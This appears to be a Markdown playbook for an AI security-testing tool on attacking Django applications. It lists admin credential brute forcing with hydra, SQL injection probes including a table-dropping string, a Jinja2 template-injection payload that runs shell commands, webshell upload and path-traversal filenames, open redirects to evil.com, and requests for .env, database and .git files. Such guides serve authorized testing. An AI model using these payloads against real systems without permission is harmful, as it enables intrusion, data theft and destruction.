<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: django
description: Security testing playbook for Django applications covering debug mode, admin exposure, ORM injection, CSRF, SSTI, and Django-specific misconfigurations
---

# Django Security Testing

Django is the most common Python web framework. Attack surface spans the admin panel, ORM queries, template engine, session/CSRF handling, and common misconfigurations like DEBUG=True in production.

---

## Reconnaissance

### Fingerprinting Django

    # Django-specific URLs and paths
    GET /admin/                     # Admin panel (very common)
    GET /admin/login/               # Admin login page
    GET /static/admin/              # Django admin static files
    GET /api/schema/                # DRF schema (if Django REST Framework used)
    GET /api/swagger/               # Swagger UI
    GET /api/redoc/                 # ReDoc
    GET /__debug__/                 # Django Debug Toolbar (dev only)
    GET /silk/                      # Django Silk profiler

    # Error pages reveal Django version
    GET /nonexistent-path-12345     # 404 — check for Django branding
    POST /any-form-without-token    # 403 Forbidden with CSRF error reveals Django

    # Headers
    X-Powered-By: Django (sometimes)
    Server: gunicorn / uvicorn

---

## Debug Mode (Critical)

DEBUG=True leaks: full stack traces with local variables, settings (including SECRET_KEY), installed apps, URL patterns, SQL queries.

    # Trigger a 500 error to see debug page
    GET /any-existing-url?param=<invalid-type>

    # Check for Django Debug Toolbar
    GET /?djdt=show
    GET /static/debug_toolbar/js/toolbar.js   # Confirms DDT installed

**Impact:** SECRET_KEY exposure = cookie/session forgery, CSRF bypass, password reset link prediction.

---

## Django Admin Panel

### Discovery

    # Common paths
    /admin/
    /django-admin/
    /backend/admin/
    /panel/admin/
    /manage/

    # Enumerate apps from admin interface (visible after login)
    # Brute-force admin credentials
    hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form \
      "/admin/login/:username=^USER^&password=^PASS^&csrfmiddlewaretoken=<token>:Please enter the correct"

### Admin Panel Attacks

    # CSRF token extraction for brute force
    curl -c cookies.txt -s <target>/admin/login/ | grep csrfmiddlewaretoken

    # Mass action exposure: check for bulk delete/update actions
    # Custom ModelAdmin views may have IDOR or missing permission checks

    # Admin object history reveals internal IDs
    GET /admin/<app>/<model>/<id>/history/

---

## SQL Injection via Django ORM

Django ORM protects against raw SQLi but raw queries exist:

    # Dangerous patterns in Django code:
    Model.objects.raw("SELECT * FROM table WHERE id = %s" % user_input)  # Vulnerable
    Model.objects.extra(where=["id = %s" % user_input])                   # Vulnerable
    cursor.execute("SELECT * FROM table WHERE id = " + user_input)         # Vulnerable

    # Safe (parameterized):
    Model.objects.raw("SELECT * FROM table WHERE id = %s", [user_input])   # Safe

### Testing for Raw Query Injection

    # Standard SQLi probes on all parameters
    ' OR '1'='1
    ' OR 1=1--
    1 AND SLEEP(5)--
    1; DROP TABLE users--

    # Django ORM filter injection (lookups)
    # Vulnerable: Model.objects.filter(**user_dict)
    # Probe: ?field__class__=<injection>  (not common but test)

---

## Template Injection (SSTI)

Django templates have limited SSTI (no eval by default) but Jinja2 is sometimes used:

    # Django template engine (limited)
    {{7*7}}                 # Won't execute — Django escapes this
    {% debug %}             # If allowed, dumps context variables (info disclosure)

    # Jinja2 templates (if configured)
    {{7*7}}                                    # 49 — confirms Jinja2
    {{config}}                                 # Django settings exposure
    {{request.META.HTTP_HOST}}                 # Server-side request info
    {{cycler.__init__.__globals__['os'].popen('id').read()}}  # RCE

    # Identify template engine first:
    {{7*'7'}}   # Returns 49 = Jinja2 | Returns 7777777 = Twig | Error = Django

---

## CSRF

    # Django CSRF checks:
    # - Checks Origin/Referer header on HTTPS
    # - Requires csrfmiddlewaretoken in POST body OR X-CSRFToken header
    # - Uses cookie-to-header pattern by default

    # Bypass attempts:
    # 1. Remove CSRF token entirely (if @csrf_exempt on view)
    # 2. Change method: POST → GET (if view accepts both)
    # 3. Content-type switch: application/json (CSRF exempt in some setups)
    # 4. Origin: null (sandboxed iframe)
    # 5. Subdomain takeover → same-site bypass

---

## Authentication & Session

    # Django session cookie: sessionid (HttpOnly, sometimes missing Secure/SameSite)
    # Check cookie attributes:
    curl -I <target> | grep -i set-cookie

    # Session fixation: test if session ID changes on login
    # 1. Get session cookie pre-login
    # 2. Login
    # 3. Check if sessionid changes

    # Password reset token analysis
    # Django uses HMAC-based tokens: <uid>-<timestamp>-<hash>
    # If SECRET_KEY is known (from DEBUG=True), tokens can be forged

    # Account enumeration via password reset timing
    POST /accounts/password/reset/   body: email=test@example.com
    # Response time difference reveals valid vs invalid emails

---

## Sensitive Endpoints

    # Django REST Framework
    GET /api/                        # Browsable API root (lists all endpoints)
    GET /api/?format=json            # Force JSON response
    GET /api/users/                  # User list (check auth)
    OPTIONS /api/<endpoint>/         # Returns allowed methods + serializer fields

    # Common DRF auth endpoints
    POST /api/auth/login/
    POST /api/auth/token/
    POST /api/token/
    GET  /api/token/refresh/

    # Django Channels (WebSocket)
    ws://<target>/ws/
    ws://<target>/ws/chat/

---

## File Upload

    # Django FileField/ImageField
    # Test: content-type bypass, filename traversal, extension bypass
    Content-Disposition: form-data; name="file"; filename="shell.php"
    Content-Type: image/jpeg
    [PHP webshell content]

    # Path traversal in filename
    filename="../../settings.py"
    filename="%2e%2e%2fsettings.py"

    # MEDIA_URL exposure: check if uploads are served without auth
    GET /media/uploads/<filename>

---

## Information Disclosure

    # .env files (common in Django deployments)
    GET /.env
    GET /config/.env

    # settings.py exposure (source code misconfig)
    GET /settings.py
    GET /app/settings.py

    # Django secret files
    GET /db.sqlite3           # SQLite database exposed
    GET /requirements.txt     # Reveals package versions + framework info
    GET /Pipfile
    GET /Pipfile.lock

    # Git exposure
    GET /.git/config
    GET /.git/HEAD

---

## Django-Specific Vulnerabilities

### Mass Assignment (DRF)

    # DRF Serializer without read_only fields
    # If serializer has no read_only_fields, extra POST fields may be accepted
    POST /api/users/profile/
    {"username": "user", "is_staff": true, "is_superuser": true}

### Open Redirect

    # Django's next parameter in login redirect
    GET /login/?next=https://evil.com
    GET /accounts/login/?next=//evil.com
    GET /accounts/login/?next=///evil.com

### Insecure Direct Object Reference

    # Django URL patterns with integer PKs
    GET /api/users/1/
    GET /api/users/2/
    # Check if auth enforces ownership

---

## Key Tools

    nuclei -t django -u <target>                    # Django-specific templates
    dirsearch -u <target> -e py,django,db           # Path discovery
    wfuzz -u <target>/admin/FUZZ/ -w wordlist.txt   # Admin path enumeration

---

## Pro Tips

1. Always check `/admin/` — Django ships it enabled by default
2. DEBUG=True exposes SECRET_KEY in error pages → forge sessions, CSRF tokens, password reset links
3. Django REST Framework browsable API at `/api/` leaks full endpoint structure
4. Check `MEDIA_ROOT` serving — uploaded files often accessible without auth
5. DRF `ModelViewSet` with `permission_classes = []` = unauthenticated access
6. `{% debug %}` template tag in templates dumps entire context (info disclosure)
7. Password reset tokens expire after 3 days by default — check `PASSWORD_RESET_TIMEOUT`

## Summary

Django testing = admin panel + DEBUG mode + DRF API enumeration + ORM raw query injection. The admin panel and DEBUG=True are the fastest critical finds. DRF APIs often have authorization gaps (missing permission_classes, IDOR via integer PKs, mass assignment via serializer fields).
